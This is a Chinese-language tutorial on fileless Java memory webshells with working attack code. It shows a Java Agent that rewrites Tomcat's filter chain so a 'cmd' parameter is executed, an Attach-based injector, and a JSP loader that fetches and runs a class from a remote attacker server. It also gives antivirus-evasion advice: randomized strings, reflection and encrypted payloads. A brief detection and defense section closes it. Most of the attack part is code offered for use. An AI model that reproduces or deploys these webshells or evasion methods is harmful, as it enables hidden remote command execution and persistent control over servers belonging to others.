引言：Webshell的进化之路

在Web安全领域，Webshell一直是攻防双方的必争之地。从最初明文的一句话木马、大马，到加密传输的“加密一句话”，传统Webshell始终无法摆脱一个致命缺陷：文件形式驻留磁盘。随着WAF、IDS/IPS、杀毒软件以及流量监控设备的普及，文件型Webshell的生存空间被极大压缩，攻击者开始寻求新的突破——内存马（Memory Webshell）应运而生。

内存马是一种无文件形态的Webshell，它不向磁盘写入任何脚本文件，而是将恶意逻辑注入到Web应用程序的内存中，通过注册路由、拦截请求等方式实现持久化控制。这种技术最早在Java、PHP等环境中被广泛讨论，如今已成为高级渗透测试和红队作战的标配。

本文将从Java内存马的原理出发，深入探讨Java Agent技术、URL类加载器在内存马注入与免杀中的应用，并结合实战代码演示如何构造无文件Webshell，最后给出针对性的防御建议。

---

一、Java内存马原理

1.1 从MVC架构理解内存马

Java Web应用通常基于MVC（Model-View-Controller）架构，所有请求通过前端控制器（如Servlet的service()方法、Spring的DispatcherServlet）分发到具体的处理器（Controller/Handler）。内存马的思路就是在Web组件的生命周期中动态注册一个新的路由，使得特定URL的请求被引导至我们预设的恶意代码执行。

例如，在Servlet容器（Tomcat、Jetty等）中，我们可以向ApplicationContext中添加一个自定义的Filter或Servlet，该组件会监听某个路径，并在请求时执行恶意逻辑。由于这些组件存在于内存中，不写入文件，因此具备天然的免杀特性。

1.2 内存马的常见类型

· Servlet型：注册一个新的Servlet，绑定到某个URL模式。
· Filter型：注册一个Filter，拦截特定请求，在过滤链中执行恶意代码。
· Listener型：注册监听器，在特定事件（如Session创建）时触发。
· Interceptor型：针对Spring MVC等框架，注册拦截器。

无论哪种类型，其本质都是利用Java反射动态修改运行时配置，将恶意组件注入容器。

---

二、Java Agent：动态注入的“手术刀”

2.1 什么是Java Agent

Java Agent是JDK 1.5引入的一种技术，允许在JVM启动后（或启动时）修改已加载类的字节码。它通常用于APM（应用性能监控）、热部署、调试等场景，但在攻防视角下，它成为注入内存马的利器。

Java Agent有两种加载方式：

· premain：在JVM启动时通过-javaagent参数加载，执行premain方法。
· agentmain：在JVM运行后通过Attach API动态加载，执行agentmain方法。

2.2 使用Agent注入Filter内存马

我们以Filter型内存马为例，展示如何通过Java Agent动态添加恶意Filter。这里使用javassist库操作字节码。

2.2.1 创建Agent类

```java
import java.lang.instrument.Instrumentation;

public class AgentMain {
    public static void agentmain(String args, Instrumentation inst) {
        inst.addTransformer(new FilterInjectTransformer(), true);
        // 获取所有已加载类，并尝试重转换目标类
        for (Class<?> clazz : inst.getAllLoadedClasses()) {
            if (clazz.getName().equals("org.apache.catalina.core.ApplicationFilterChain")) {
                try {
                    inst.retransformClasses(clazz);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
```

2.2.2 实现字节码转换器

```java
import javassist.*;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class FilterInjectTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className,
                            Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain,
                            byte[] classfileBuffer) {
        if (!"org/apache/catalina/core/ApplicationFilterChain".equals(className)) {
            return null;
        }
        try {
            ClassPool cp = ClassPool.getDefault();
            CtClass ctClass = cp.get("org.apache.catalina.core.ApplicationFilterChain");
            CtMethod doFilter = ctClass.getDeclaredMethod("doFilter");
            doFilter.insertBefore(createFilterCode());
            return ctClass.toBytecode();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private String createFilterCode() {
        // 插入恶意Filter逻辑：检查请求参数，若包含特定cmd则执行系统命令
        return "javax.servlet.http.HttpServletRequest req = request; " +
               "String cmd = req.getParameter(\"cmd\"); " +
               "if (cmd != null) { " +
               "   try { java.lang.Runtime.getRuntime().exec(cmd); } catch (Exception e){} " +
               "}";
    }
}
```

2.2.3 动态Attach到目标进程

```java
import com.sun.tools.attach.*;

public class AttachMain {
    public static void main(String[] args) 
            throws AttachNotSupportedException, IOException, 
                   AgentLoadException, AgentInitializationException {
        VirtualMachine vm = VirtualMachine.attach("12345"); // 目标JVM PID
        vm.loadAgent("/path/to/agent.jar");
        vm.detach();
    }
}
```

通过这种方式，无需任何文件落地，即可在目标容器中植入内存马。类似项目可参考rebeyond/memShell。

---

三、类加载器与远程代码加载

3.1 URLClassLoader：从远程加载类

Java的类加载机制提供了灵活的扩展能力，其中URLClassLoader可以从指定的URL（如http://、file://）加载类和资源。攻击者可以利用这一特性，将恶意字节码存放在远程服务器上，然后在目标应用中通过URLClassLoader动态加载并实例化，从而实现无文件Webshell。

3.2 编写一个远程加载的JSP马

3.2.1 远程类（Run.java）

```java
import java.io.IOException;

public class Run {
    public Run() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```

编译并启动HTTP服务：

```bash
javac Run.java
python3 -m http.server 8888
```

3.2.2 JSP加载器

```jsp
<%@ page import="java.net.URL, java.net.URLClassLoader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    try {
        URLClassLoader urlClassLoader = new URLClassLoader(
            new URL[]{new URL("http://your-server:8888/")}
        );
        Class<?> aClass = urlClassLoader.loadClass("Run");
        aClass.newInstance();
        out.println("Class loaded and executed.");
    } catch (Exception e) {
        out.println("Error: " + e);
    }
%>
```

将上述JSP上传至目标服务器（这一步仍需要文件落地，但可结合文件包含或漏洞上传），访问即可触发远程类加载，执行命令。当然，更优雅的方式是直接通过反序列化等漏洞触发类加载逻辑，彻底避免上传文件。

3.3 结合文件包含与远程读取

在某些PHP或JSP环境中，可利用文件包含漏洞（LFI/RFI）配合伪协议（如php://input、http://）读取远程代码并执行。例如：

```jsp
// 通过URLClassLoader动态加载远程类，无需本地文件
// 可直接在漏洞利用时构造这段代码并执行（如通过反序列化）
```

---

四、免杀与实战技巧

4.1 免杀工具的特征规避

市面上常见的内存马生成工具（如MemShellParty、java-memshell-generator）虽然功能强大，但其生成的代码往往带有固定特征（如类名、字符串、注入逻辑）。攻击者需要对其进行二次改造，例如：

· 修改特征字符串（如cmd、exec）为随机值。
· 使用反射调用敏感方法，避免直接引用Runtime等类。
· 加密关键代码，在内存中动态解密执行。

4.2 结合已知漏洞实现无文件注入

真正的无文件Webshell应完全避免上传任何脚本，而是利用目标自身的漏洞（反序列化、SSTI、RCE）直接执行内存马注入逻辑。例如：

· 反序列化漏洞：构造Gadget链，在反序列化过程中执行URLClassLoader.loadClass或Agent Attach操作。
· SSTI注入：在模板引擎中注入恶意表达式，动态注册Filter。
· 任意文件写入+包含：写入一个极小的加载器，然后从远程加载核心Payload。

4.3 案例：基于反序列化的Agent注入

通过反序列化触发VirtualMachine.attach需要满足条件：目标JDK包含tools.jar且具有Attach权限（通常需要相同用户）。但在实际渗透中，更常见的是通过反序列化执行URLClassLoader加载远程类，直接注册内存马。

---

五、内存马的检测与防御

5.1 检测思路

· 基于容器的运行时审计：定期扫描容器注册表（如Tomcat的ApplicationContext中是否有异常Filter/Servlet）。
· 流量监测：分析HTTP请求，发现异常参数（如cmd=）及响应特征。
· JVM内存扫描：使用Java Agent或JMX列出所有已加载类，查找可疑类名或字节码特征。
· 日志分析：监控Filter/Servlet的注册行为，发现非预期的组件添加。

5.2 防御措施

· 限制动态注册：在容器配置中禁用动态添加Filter/Servlet（如Tomcat的context.reloadable="false"）。
· 使用SecurityManager：限制反射和类加载权限。
· RASP（运行时应用自我保护）：在关键API（如ClassLoader.defineClass、Runtime.exec）处埋点，检测异常行为。
· 补丁管理：及时修复反序列化、RCE等高危漏洞，从源头阻止攻击者执行注入代码。

---

结语

内存马技术是Webshell演化的重要里程碑，它充分利用了Java平台的动态特性，实现了无文件、高隐蔽的持久化控制。本文从内存马原理出发，深入探讨了Java Agent和类加载器在内存马注入与免杀中的应用，并给出了实战代码。对于防御者而言，理解这些攻击手法是构建有效防护的前提。只有深入掌握底层原理，才能在攻防对抗中立于不败之地。

---

参考资料

· MemShellParty
· java-memshell-generator
· rebeyond/memShell
· ShellGenerate
· Java Agent官方文档
